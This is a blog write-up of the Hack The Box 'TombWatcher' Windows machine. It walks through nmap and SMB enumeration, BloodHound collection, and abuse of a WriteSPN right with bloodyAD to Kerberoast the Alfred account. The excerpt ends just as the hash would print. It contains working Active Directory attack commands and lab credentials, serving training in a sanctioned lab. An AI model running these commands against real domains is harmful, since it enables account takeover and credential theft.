---
title: TombWatcher
date: 2026-06-12
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - medium
  - Bloodhound-Vectory-GenericAll
  - Bloodhound-Vectory-WriteOwner
  - Bloodhound-Vectory-ForceChangePassword
  - Bloodhound-Vectory-ReadGMSAPassword
  - Bloodhound-Vectory-WriteSPN
  - Bloodhound-Vectory-AddSelf-Infrastructure
lastmod: 2026-06-18T03:19:11.490Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/TombWatcher" >}}

***

If you forget the bloodhound 's password , can use the bloodhound-cli config to fix it

```
┌─[tester@parrot]─[/opt]
└──╼ $sudo ./bloodhound-cli config
[+] Current configuration:
{
  "bind_addr": "0.0.0.0:8080",
  "collectors_base_path": "/etc/bloodhound/collectors",
  "config_directory": "/root/.config/bloodhound",
  "default_admin": {
    "password": "5Hi70AQLphfvzmzJ4fQF848plPx54UDj",
    "principal_name": "admin"
  },
  "default_password": "5Hi70AQLphfvzmzJ4fQF848plPx54UDj",
  "log_level": "INFO",
  "log_path": "bloodhound.log",
  "metrics_port": ":2112",
  "recreatedefaultadmin": "false",
  "root_url": "http://127.0.0.1:8080",
  "tls": {
    "cert_file": "",
    "key_file": ""
  },
  "version": 1,
  "work_dir": "/opt/bloodhound/work"
}

[+] To adjust a configuration value, use the 'config set' subcommand. For example:
  config set graph_driver neo4j
[+] To retrieve an individual configuration value, use the 'config get' subcommand. For example:
  config get graph_driver
[+] For more information on configuration options, see the documentation:
  https://bloodhound.specterops.io/manage-bloodhound/bh-config

```

# Recon

### \[\[PORT & IP SCAN]]

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.232.167 --min-rate 10000
Host is up, received echo-reply ttl 127 (0.27s latency).
Scanned at 2026-06-12 17:04:33 HKT for 20s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
49716/tcp open  unknown          syn-ack ttl 127
49722/tcp open  unknown          syn-ack ttl 127
49741/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
           Raw packets sent: 196580 (8.649MB) | Rcvd: 35 (1.524KB)

```

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry\_987TGV!

### DNS

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ nxc smb 10.129.232.167  --generate-hosts-file  hosts
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $cat hosts 
10.129.232.167     DC01.tombwatcher.htb tombwatcher.htb DC01

```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $cat /etc/hosts 
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.129.232.167  DC01.tombwatcher.htb tombwatcher.htb DC01

::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

```

### Account Verify

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC01.tombwatcher.htb  -u 'henry' -p 'H3nry_987TGV!'; done

[*] Testing smb...
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Testing winrm...
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.129.232.167  5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!

[*] Testing wmi...
RPC         10.129.232.167  135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
RPC         10.129.232.167  135    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Testing rdp...

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Testing mssql...

```

### SMB

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --shares --spider "SYSVOL" --regex .
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.167  445    DC01             [*] Spidering .
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/DfsrPrivate [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/scripts [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9} [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9} [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI [lastm:'2025-04-25 22:57' size:22]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2025-04-25 22:57' size:1098]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI [lastm:'2024-11-16 08:57' size:22]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2024-11-16 08:57' size:4542]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/.. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/scripts/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/SYSVOL/tombwatcher.htb/scripts/.. [dir]
```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --shares --spider "NETLOGON" --regex .
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.167  445    DC01             [*] Spidering .
SMB         10.129.232.167  445    DC01             //10.129.232.167/NETLOGON/. [dir]
SMB         10.129.232.167  445    DC01             //10.129.232.167/NETLOGON/.. [dir]

```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --shares --spider "IPC$ " --regex .
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.167  445    DC01             [*] Spidering .

```

### Bloodhound

let do the bloodhound

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec ldap  10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --bloodhound -c All --dns-server 10.129.232.167
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             Resolved collection methods: trusts, psremote, localadmin, rdp, session, dcom, acl, objectprops, container, group
LDAP        10.129.232.167  389    DC01             Done in 1M 6S
LDAP        10.129.232.167  389    DC01             Compressing output into /home/tester/.nxc/logs/DC01_10.129.232.167_2026-06-12_172700_bloodhound.zip

```

also the rusthound for double confirme

```
┌─[tester@parrot]─[/opt]
└──╼ $./rusthound-ce --domain tombwatcher.htb  -u henry   -p 'H3nry_987TGV!' --zip
---------------------------------------------------
Initializing RustHound-CE at 17:30:24 on 06/12/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-12T09:30:24Z INFO  rusthound_ce] Verbosity level: Info
[2026-06-12T09:30:24Z INFO  rusthound_ce] Collection method: All
[2026-06-12T09:30:24Z INFO  rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!
[2026-06-12T09:30:24Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-06-12T09:30:25Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-12T09:30:28Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=tombwatcher,DC=htb
[2026-06-12T09:30:28Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-12T09:30:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=tombwatcher,DC=htb
[2026-06-12T09:30:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-12T09:31:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
[2026-06-12T09:31:08Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-12T09:31:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=tombwatcher,DC=htb
[2026-06-12T09:31:09Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-12T09:31:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=tombwatcher,DC=htb
[2026-06-12T09:31:09Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-06-12T09:31:09Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 5%                                                                                                                                                                             [2026-06-12T09:31:09Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-06-12T09:31:09Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-06-12T09:31:09Z INFO  rusthound_ce::json::maker::common] .//20260612173109_tombwatcher-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 17:31:09 on 06/12/26! Happy Graphing!

```

![Pasted image 20260612173144.png](/ob/Pasted%20image%2020260612173144.png)

Upload both

Henry is the target and having the WriteSPN

### WriteSPN

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-WriteSPN" >}} Using the bloodyAD and netexec to abuse the WriteSPN

{{< /toggle >}}

![Pasted image 20260612173419.png](/ob/Pasted%20image%2020260612173419.png)

* Ensure `pipx` is installed on your system:

  ```
  sudo apt update && sudo apt install pipx -y
  pipx ensurepath
  ```

  *(Note: If `pipx ensurepath` modifies your shell, you might need to run `source ~/.bashrc` or open a new terminal tab).*

* Install `bloodyAD`:

  ```
  pipx install bloodyAD
  ```

* Run it from anywhere:

  ```
  bloodyAD --help
  ```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $bloodyAD -d tombwatcher.htb  -u henry -p 'H3nry_987TGV!'  --host DC01.tombwatcher.htb  set object ALFRED  servicePrincipalName -v 'http/whatever'
[+] ALFRED's servicePrincipalName has been updated

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec ldap  10.129.232.167 -u 'henry' -p 'H3nry_987TGV!'  --kerberoasting kerberoasting.hashe
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.232.167  389    DC01             [*] Total of records returned 1
[17:41:27] ERROR    Exception while calling proto_flow() on target 10.129.232.167: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)                                  connection.py:187
                    ╭─────────────────────────────────────────────────────────── Traceback (most recent call last) ────────────────────────────────────────────────────────────╮                  
                    │ /tmp/_MEIOxYgRj/nxc/protocols/ldap/kerberos.py:157 in get_tgt_kerberoasting                                                                              │                  
                    │                                                                                                                                                          │                  
                    │   154 │   │   # If no clear text password is provided, we just go with the defaults.                                                                     │                  
                    │   155 │   │   if self.password != "" and (self.lmhash == "" and self.nthash == ""):                                                                      │                  
                    │   156 │   │   │   try:                                                                                                                                   │                  
                    │ ❱ 157 │   │   │   │   tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(                                                                           │                  
                    │   158 │   │   │   │   │   user_name,                                                                                                                     │                  
                    │   159 │   │   │   │   │   "",                                                                                                                            │                  
                    │   160 │   │   │   │   │   self.domain,                                                                                                                   │                  
                    │                                                                                                                                                          │                  
                    │ in getKerberosTGT:323                                                                                                                                    │                  
                    │                                                                                                                                                          │                  
                    │ in sendReceive:93                                                                                                                                        │                  
                    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯                  
                    KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)                                                                                                   
                                                                                                                                                                                                  
                    During handling of the above exception, another exception occurred:                                                                                                           
                                                                                                                                                                                                  
                    ╭─────────────────────────────────────────────────────────── Traceback (most recent call last) ────────────────────────────────────────────────────────────╮                  
                    │ in __init__:177                                                                                                                                          │                  
                    │                                                                                                                                                          │                  
                    │ in proto_flow:261                                                                                                                                        │                  
                    │                                                                                                                                                          │                  
                    │ in call_cmd_args:283                                                                                                                                     │                  
                    │                                                                                                                                                          │                  
                    │ /tmp/_MEIOxYgRj/nxc/protocols/ldap.py:1127 in kerberoasting                                                                                              │                  
                    │                                                                                                                                                          │                  
                    │   1124 │   │   │                                                                                                                                         │                  
                    │   1125 │   │   │   for user in enabled:                                                                                                                  │                  
                    │   1126 │   │   │   │   # Perform Kerberos Attack                                                                                                         │                  
                    │ ❱ 1127 │   │   │   │   TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)                                                                │                  
                    │   1128 │   │   │   │   self.logger.debug(f"TGT: {TGT}")                                                                                                  │                  
                    │   1129 │   │   │   │   if TGT:                                                                                                                           │                  
                    │   1130 │   │   │   │   │   downLevelLogonName =                                                                                                          │                  
                    │        f"{self.targetDomain}\\{user['sAMAccountName']}"                                                                                                  │                  
                    │                                                                                                                                                          │                  
                    │ /tmp/_MEIOxYgRj/nxc/protocols/ldap/kerberos.py:174 in get_tgt_kerberoasting                                                                              │                  
                    │                                                                                                                                                          │                  
                    │   171 │   │   │   │   return None                                                                                                                        │                  
                    │   172 │   │   │   except Exception as e:                                                                                                                 │                  
                    │   173 │   │   │   │   nxc_logger.debug(f"TGT: {e!s}")                                                                                                    │                  
                    │ ❱ 174 │   │   │   │   tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(                                                                           │                  
                    │   175 │   │   │   │   │   user_name,                                                                                                                     │                  
                    │   176 │   │   │   │   │   self.password,                                                                                                                 │                  
                    │   177 │   │   │   │   │   self.domain,                                                                                                                   │                  
                    │                                                                                                                                                          │                  
                    │ in getKerberosTGT:323                                                                                                                                    │                  
                    │                                                                                                                                                          │                  
                    │ in sendReceive:93                                                                                                                                        │                  
                    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯                  
                    KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $timedatectl set-ntp false
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ntpdate tombwatcher.htb
2026-06-12 21:42:11.675490 (+0800) +14400.481779 +/- 0.110238 tombwatcher.htb 10.129.232.167 s1 no-leap
CLOCK: step_systime: Operation not permitted

```

try a few time , and need to sudo

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $timedatectl set-ntp false
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $sudo ntpdate 10.129.232.167
2026-06-12 21:48:52.362403 (+0800) +14400.489087 +/- 0.109170 10.129.232.167 s1 no-leap
CLOCK: time stepped by 14400.489087
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $python3 targetedKerberoast.py  -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat --dc-host dc01.tombwatcher.htb 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Alfred)
